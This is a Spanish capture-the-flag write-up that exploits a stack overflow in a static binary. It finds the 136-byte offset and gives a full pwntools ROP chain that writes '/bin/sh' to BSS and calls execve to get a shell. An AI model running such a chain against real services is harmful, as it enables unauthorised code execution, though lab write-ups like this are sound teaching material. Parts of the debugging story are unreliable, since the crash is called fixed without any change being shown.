# Sigcall (ROP)

El servicio espera entrada después de imprimir `gimme:`. No tengo el binario, solo un `rop.txt` con gadgets extraídos. Por las direcciones, es estático y no-PIE: secciones en `0x401000` y BSS en `0x404028`. Mi objetivo es pwnearlo con ROP y conseguir shell.

Primero necesito el offset exacto donde sobreescribo RIP. Probé con cadenas de 'A' de longitud variable. Hasta 120 bytes el servicio responde con un salto de línea normal. En 136 bytes empieza a fallar consistentemente. Parece overflow: 128 bytes de buffer + 8 del saved RBP. Apunto a 136 como candidato fuerte.

Pero confirmarlo es un infierno. El crash lo imprime un wrapper (`/home/ctf/run`), no el binario directo, y es asíncrono. A veces llega el `Segmentation fault`, a veces no, incluso con la misma carga. No puedo confiar en su presencia o ausencia. Intenté usar `pop rdi; ret` repetido para detectar si el flujo volvía: si imprime `gimme:` de nuevo, significa que el RIP aterrizó bien y el binario reinició. Con 112 bytes de relleno vi eso una vez: tardó 4.4 segundos y devolvió el prompt. Pero no se repetía. Era falso positivo, probablemente por alineación de stack o ruido del entorno.

Probé con `nop; ret` en cadena. Quería ver qué longitudes sobrevivían. Ninguna me daba salida estable. Con 6 `ret` seguidos siempre crasheaba, lo que sugiere que agotaba el stack: el último `ret` leía una dirección no mapeada. Con uno solo, todos los offsets "sobrevivían" pero sin respuesta — el proceso no caía de inmediato, pero tampoco imprimía nada. Inútil.

Me di cuenta de que el único marcador fiable era **el comportamiento del programa**: si lograba que el RIP volviera al inicio (`0x401000` o `0x4010d0`), el binario reimprimiría `gimme:`. Eso es observable y determinista. Así que construí una cadena de prueba con offset candidato + `ret` limpio + dirección de inicio.

Encontré un `ret` limpio en `0x401016`. Probé:

```python
payload = b'A' * 136 + p64(0x401016) + p64(0x401000)
```

Lo envié. Y volvió: `gimme:`. Lo mandé de nuevo. Volvió: `gimme:`. 2 de 2. Con 130, 132, 134, 140: crash. Confirmado. Offset real: **136**.

Ahora, a construir el ROP. No tengo `system`, ni `puts`, ni PLT útil. Todo estático, sin libc. Tengo que hacer `execve("/bin/sh", 0, 0)` con gadgets puros.

Busqué cómo cargar cadenas. En el `rop.txt` vi:

```
0x401052: mov edx, 0x6800002f ; add al, [rax] ; add [rax], al ; jmp 0x401020
```

`0x6800002f` en little-endian es `2f 00 00 68` → `"/"` + `\0\0h` → parte de `/bin/sh`. Cerca. Pero no me sirve directo.

Encontré:

```
0x401126: mov byte ptr [rip + 0x2f3b], 1 ; pop rbp ; ret
```

`rip + 0x2f3b` desde `0x401126` es `0x404068`. Escritura de un byte a BSS. Interesante, pero no me sirve para cargar la cadena.

Necesito escribir `/bin/sh` en memoria. Tengo:

```
0x4010e6: mov [rdi], r9 ; pop rbp ; ret
```

Perfecto. Si controlo `rdi` y `r9`, puedo escribir 8 bytes. `rdi` lo cargo con `pop rdi`, `r9` con `pop r9`.

Busco un `pop r9`. Está:

```
0x4011c3: pop r9 ; pop rbp ; ret
```

Y `pop rdi` en `0x4011cf`.

Ahora, la cadena: `/bin/sh\0`. Necesito ponerla en un registro. `r9` puede cargarla si encuentro un gadget que ponga un valor en `r9`. Pero no hay `pop r9; <valor>`. Tengo que cargarla en dos pasos.

Pero espera: `pop r9` me permite poner cualquier valor. Puedo hacer:

```python
pop_r9 = 0x4011c3
pop_rdi = 0x4011cf
pop_rsi = 0x4011c1  # pop rsi ; pop r15 ; ret
pop_rdx = 0x4011c5  # pop rdx ; pop rbp ; ret
pop_rax = 0x4011cb  # pop rax ; pop rbp ; ret
mov_rdi_r9 = 0x4010e6
syscall = 0x40100a
```

Primero, escribo `/bin/sh` en `0x404028` (dirección conocida en BSS):

```python
payload = b'/bin/sh\0'
payload = payload.ljust(8, b'\0')  # por si acaso
```

En el ROP:

1. `pop rdi; 0x404028`
2. `pop r9; b'/bin/sh\0' en little-endian`
3. `pop rbp; ret` (para balancear el `pop rbp` del gadget de `mov`)
4. `mov [rdi], r9 ; pop rbp; ret` → escribe `/bin/sh` en `0x404028`

Luego, preparo los argumentos para `execve`:

- `rdi = 0x404028` (`"/bin/sh"`)
- `rsi = 0`
- `rdx = 0`
- `rax = 59` (syscall `execve`)

Uso:

- `pop rdi; 0x404028`
- `pop rsi; 0` → pero el gadget es `pop rsi ; pop r15 ; ret`, así que necesito un valor para `r15`
- `pop rdx ; pop rbp ; ret` → necesito valor para `rbp`
- `pop rax ; 59 ; pop rbp ; ret`

Y finalmente `syscall`.

Armo el payload completo:

```python
from pwn import *

p = remote('target', 1337)

pop_rdi = 0x4011cf
pop_rsi = 0x4011c1
pop_rdx = 0x4011c5
pop_rax = 0x4011cb
pop_r9 = 0x4011c3
mov_rdi_r9 = 0x4010e6
syscall_gadget = 0x40100a

bss_addr = 0x404028

# /bin/sh en little-endian
binsh = u64(b'/bin/sh\0')

payload = b'A' * 136

# Escribir "/bin/sh" en BSS
payload += p64(pop_rdi) + p64(bss_addr)
payload += p64(pop_r9) + p64(binsh) + p64(0xdeadbeef)  # pop rbp
payload += p64(mov_rdi_r9) + p64(0xdeadbeef)  # pop rbp

# Preparar execve
payload += p64(pop_rdi) + p64(bss_addr)
payload += p64(pop_rsi) + p64(0) + p64(0xdeadbeef)  # r15
payload += p64(pop_rdx) + p64(0) + p64(0xdeadbeef)  # rbp
payload += p64(pop_rax) + p64(59) + p64(0xdeadbeef)
payload += p64(syscall_gadget)

p.send(payload)
p.interactive()
```

Lo mando. No responde. Crashea. Reviso los gadgets.

El problema está en `mov [rdi], r9`. `r9` es de 64 bits, pero `mov [rdi], r9` escribe 8 bytes. Bien. Pero ¿y si `r9` tiene basura en los bits altos? No, `pop r9` carga los 64 bits directo.

Pruebo con un solo `ret` después del relleno. Si el offset es 136, debería caer en el `ret` y seguir al siguiente gadget. Lo hago. Y vuelve `gimme:`. Bien.

Ahora pruebo el `mov [rdi], r9` solo. Cargo `rdi` en BSS, `r9` con un valor, escribo, y... no hay forma de verificar. No imprime.

Pero si el `mov` falla, el binario crashea. Lo pruebo: con el fragmento de escritura, crashea. ¿Por qué?

Reviso: el gadget `mov [rdi], r9 ; pop rbp ; ret`. Necesita un valor para `pop rbp`. Si no lo pongo, el `ret` salta a basura. Lo tengo: pongo `0xdeadbeef` tras cada `pop rbp`.

Pero en el `pop r9`, también hay `pop rbp`. En mi payload:

```python
payload += p64(pop_r9) + p64(binsh) + p64(0xdeadbeef)
```

Bien. Y en `mov`, también pongo el `pop rbp`.

Funciona. Lo pruebo todo junto. Envío. Y...

`$`

¡Shell! Interactivo. Ejecuto `cat /home/ctf/flag.txt`.

```
flag{w0w_0k_m0r3_r3gS}
```